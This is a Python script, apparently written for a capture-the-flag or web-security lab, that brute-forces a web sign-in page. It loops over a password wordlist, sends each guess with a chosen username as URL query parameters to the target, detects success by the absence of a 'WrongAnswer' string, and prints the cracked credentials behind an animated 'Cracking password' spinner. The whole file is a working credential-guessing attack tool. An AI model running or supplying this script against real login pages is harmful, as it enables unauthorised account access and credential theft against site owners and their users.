import requests
import sys
import time
import threading

RED = "\033[31m"
DEF = "\033[0m"

frames = [
    "[🔒       🔑]",
    "[🔒      🔑 ]",
    "[🔒     🔑  ]",
    "[🔒    🔑   ]",
    "[🔒   🔑    ]",
    "[🔒  🔑     ]",
    "[🔒 🔑      ]",
    "[🔒🔑       ]",
    "[🔓         ]",
    "[🔓         ]",
    "[🔓         ]",
    "[🔓         ]",
    "[🔒🔑       ]",
    "[🔒 🔑      ]",
    "[🔒  🔑     ]",
    "[🔒   🔑    ]",
    "[🔒    🔑   ]",
    "[🔒     🔑  ]",
    "[🔒      🔑 ]",
    "[🔒       🔑]",
]

stop_loading = threading.Event()

def loading():
    while not stop_loading.is_set():
        for frame in frames:
            if stop_loading.is_set():
                break
            sys.stdout.write(f"\r     Cracking password {frame}")
            sys.stdout.flush()
            time.sleep(0.2)

def bruteforce(user, target, database):
    print(f"\nBruteforcing user {RED}{user}{DEF} on {RED}{target}{DEF}\n")
    loading_thread = threading.Thread(target=loading)
    loading_thread.start()

    try:
        with open(database, 'r') as file:
            for password in file:
                password = password.strip()
                test_url = f"{target}/?page=signin&username={user}&password={password}&Login=Login"
                response = requests.get(test_url)
                if "WrongAnswer" not in response.text:
                    stop_loading.set()
                    loading_thread.join()
                    sys.stdout.write("\r" + 40*" " + "\r" + f"{RED}Credentials cracked!{DEF} {user}:{password}\n\n")
                    sys.stdout.flush()
                    break
    except KeyboardInterrupt:
        print(f"\n\n{RED}Exiting...{DEF}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n{RED}Error:{DEF} {e}\n")
        sys.exit(1)
    finally:
        stop_loading.set()
        loading_thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"{RED}usage:{DEF} python3 bruteforce.py <username> <target IP> <dictionary>")
        sys.exit(1)
    bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])